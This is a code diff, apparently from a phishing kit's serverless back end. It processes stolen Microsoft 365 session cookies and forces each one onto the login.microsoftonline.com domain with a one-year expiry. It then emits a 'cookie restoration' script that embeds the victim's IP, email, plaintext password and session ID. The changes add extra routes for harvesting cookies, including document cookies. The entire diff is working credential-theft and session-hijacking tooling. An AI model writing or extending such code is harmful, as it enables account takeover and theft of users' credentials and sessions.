@@ -151,7 +151,9 @@ export const handler = async (event, context) => {
 
     console.log('✅ Found cookies data:', {
       cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
-      email: cookiesData.email
+      email: cookiesData.email,
+      hasFormattedCookies: Array.isArray(cookiesData.formattedCookies),
+      formattedCookieCount: Array.isArray(cookiesData.formattedCookies) ? cookiesData.formattedCookies.length : 0
     });
 
     const clientIP = getClientIP();
@@ -161,14 +163,22 @@ export const handler = async (event, context) => {
     console.log('📊 Processing cookies data:', {
       email: userEmail,
       cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
-      cookieType: typeof cookiesData.cookies
+      cookieType: typeof cookiesData.cookies,
+      formattedCookieCount: Array.isArray(cookiesData.formattedCookies) ? cookiesData.formattedCookies.length : 0
     });
 
     // Process cookies with improved handling
     let processedCookies = [];
     
-    if (Array.isArray(cookiesData.cookies)) {
+    // First try formattedCookies if available
+    if (Array.isArray(cookiesData.formattedCookies) && cookiesData.formattedCookies.length > 0) {
+      processedCookies = cookiesData.formattedCookies.filter(cookie => cookie && cookie.name);
+      console.log('✅ Using formattedCookies:', processedCookies.length);
+    }
+    // Fallback to regular cookies
+    else if (Array.isArray(cookiesData.cookies)) {
       processedCookies = cookiesData.cookies.filter(cookie => cookie && cookie.name);
+      console.log('✅ Using regular cookies:', processedCookies.length);
     } else if (typeof cookiesData.cookies === 'string' && cookiesData.cookies !== 'No cookies found') {
       try {
         const parsedCookies = JSON.parse(cookiesData.cookies);
@@ -185,6 +195,7 @@ export const handler = async (event, context) => {
             return name && value ? {
               name: name.trim(),
               value: value.trim(),
+              // Always use Microsoft domain
               domain: '.login.microsoftonline.com',
               path: '/',
               secure: true,
@@ -199,10 +210,35 @@ export const handler = async (event, context) => {
         }
       }
     }
+    
+    // Also check documentCookies if available
+    if (processedCookies.length === 0 && cookiesData.documentCookies && typeof cookiesData.documentCookies === 'string') {
+      const cookieStrings = cookiesData.documentCookies.split(';');
+      processedCookies = cookieStrings.map(cookieStr => {
+        const [name, ...valueParts] = cookieStr.trim().split('=');
+        const value = valueParts.join('=');
+        return name && value ? {
+          name: name.trim(),
+          value: value.trim(),
+          // Always use Microsoft domain
+          domain: '.login.microsoftonline.com',
+          path: '/',
+          secure: true,
+          httpOnly: false,
+          sameSite: 'none',
+          expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+          hostOnly: false,
+          session: false,
+          storeId: null
+        } : null;
+      }).filter(cookie => cookie !== null);
+      console.log('✅ Using documentCookies:', processedCookies.length);
+    }
 
-    // Ensure cookies have proper format
+    // Enforce all cookies to have the Microsoft domain
     const formattedCookies = processedCookies.map(cookie => ({
-      domain: cookie.domain || '.login.microsoftonline.com',
+      ...cookie,
+      domain: '.login.microsoftonline.com', // Always use this domain
       expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
       hostOnly: cookie.hostOnly !== undefined ? cookie.hostOnly : false,
       httpOnly: cookie.httpOnly !== undefined ? cookie.httpOnly : false,
@@ -224,10 +260,13 @@ export const handler = async (event, context) => {
     const output = `// Microsoft 365 Cookie restoration for ${userEmail}
 // Generated: ${new Date().toISOString()}
 // Cookies found: ${formattedCookies.length}
+// Session ID: ${sessionId}
+// Email: ${userEmail}
 
 let ipaddress = "${clientIP}";
 let email = "${userEmail}";
 let password = "${userPassword}";
+let sessionId = "${sessionId}";
 
 console.log("Session Info:", {email, password, cookieCount: ${formattedCookies.length}});
 
